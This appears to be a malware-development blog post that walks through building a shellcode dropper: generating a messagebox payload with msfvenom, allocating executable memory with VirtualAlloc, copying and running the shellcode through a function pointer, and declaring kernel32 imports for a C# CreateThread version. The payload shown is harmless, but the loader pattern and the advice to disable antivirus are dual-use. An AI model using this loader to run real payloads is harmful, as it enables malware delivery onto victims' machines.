### Coding the dropper (CreateThread)

This will be the simpler of all the droppers; it'll work as a foundation for the next blog posts. The idea is super simple: load a hardcoded shellcode in memory, allocate it in memory so we can get a pointer to it, execute the shellcode at the allocated address. The code will be very small.

#### 1. Hardcode a shellcode in memory

For this demo, let's create a messagebox from msfvenom. This code is flagged as malicious by basically every AV but it isn't dangerous — perfect for our purposes. You can use your kali machine or install on any linux machine with `sudo apt-get install metasploit-framework`.

- Run the following command:

```bash
msfvenom -p windows/x64/messagebox -f c TEXT="Hello, from malware :D" TITLE="Malware"
```

![msfvenom output]({{ '/assets/images/maldev-0x00/f14f10d8a931e9bc46bf60e9b0edd0f1.png' | relative_url }})

PS: This command creates a shellcode in C format (which is the same for C++) — the shellcode executes a messagebox using windows functions for a 64-bit machine.

- Now just copy and paste the shellcode to our main function

![Shellcode pasted into main]({{ '/assets/images/maldev-0x00/d4390c0bebb6b8a953ebeab303f28f59.png' | relative_url }})

#### 2. Allocating an address for the shellcode

- Add `#include <windows.h>` to the import section

![windows.h include]({{ '/assets/images/maldev-0x00/5d09c9a25aef44cbdf8fac4355866c9a.png' | relative_url }})

- Call `VirtualAlloc` in a void pointer address with the following snippet:

```cpp
// Shellcode Allocation
void* allocatedFunctionAddress = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
// Check for errors in the allocation process
if (allocatedFunctionAddress == NULL) {
    DWORD error = GetLastError();
    std::cerr << "VirtualAlloc failed with error code: " << error << std::endl;
    return 1;
}
```

`VirtualAlloc` receives 4 arguments. The first one is optional and refers to the initial address of the allocation — since we don't really care about that, we set it to `NULL`. The second is the size of the allocated region; we just need the size of the `buf` variable. The third is the allocation type — `MEM_COMMIT` automatically reserves a virtual memory page and zeroes its content. The fourth is the memory protection type; in this case `PAGE_EXECUTE_READWRITE` because we need to write our shellcode, read it, and execute it. For more detail and other allocation types, refer to [the Microsoft documentation](https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).

If the returned address is `NULL`, something went wrong; for debugging purposes we get the error code with `GetLastError`.

#### 3. Copying buf content

This one is pretty straightforward — just copy the contents of `buf` into the allocated address.

```cpp
// Copy the content of buf to the new address
memcpy(allocatedFunctionAddress, buf, sizeof buf);
```

For more information, as always, [refer to the docs](https://learn.microsoft.com/pt-br/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170).

#### 4. Execute the shellcode

For executing our code, we can use some C/C++ magic to typecast our allocated address as a function pointer and just call it as a normal function. The steps here are more intuitive — you'll see online plenty of one-liners that do the same thing, but here I'll break it down in a more "clean code" manner.

```cpp
// Create a type for our shellcode function, we'll expect an int to return
typedef int (*BufFunction)();
// Convert to function pointer
BufFunction bufF = reinterpret_cast<BufFunction>(allocatedFunctionAddress);
// Call the function and print the result
int result = bufF();
std::cout << "Result: " << result << std::endl;
```

#### 5. Wrapping it up

If you compiled correctly and disabled your antivirus you should be able to execute the code and get a message box that says: **Hello, from malware!**

### Calling Win32 functions from C#

This is the main part — covering this should be enough for you to come up with a working code. You'll need to import this library `using System.Runtime.InteropServices;` which will allow you to import `kernel32.dll` functions (which refer to the functions in `windows.h`, some of them at least).

After importing, we can call external exports from windows DLLs like this:

```csharp
[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

We only need these three for our dropper.

`VirtualAlloc` is already covered, let's cover the other Win32 functions then.

The **`CreateThread`** function is a fundamental building block for multithreaded applications. It's part of the Windows API and is typically used to spawn a new thread within a process. We're going to need it to execute our shellcode in a separate thread. Key parameters:

- **lpThreadAttributes**: A pointer to a `SECURITY_ATTRIBUTES` structure that determines whether the returned handle can be inherited by child processes.
- **dwStackSize**: The initial size of the stack, in bytes. If zero, the new thread uses the default stack size.
- **lpStartAddress**: A pointer to the application-defined function that the new thread will execute.
- **param**: A pointer to a variable to be passed to the thread function.
- **dwCreationFlags**: Flags that control the creation of the thread.
- **lpThreadId**: A pointer to a variable that receives the thread identifier. If `NULL`, the thread identifier is not returned.

The **`WaitForSingleObject`** function is crucial for synchronization in multithreaded applications. It enables a thread to wait until the specified object is in the signaled state — think of it as an `await` for async programming. Parameters:

- **hHandle**: A handle to the object. This can be a handle to a thread, process, or other types of objects.
- **dwMilliseconds**: The time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the time-out interval elapses.
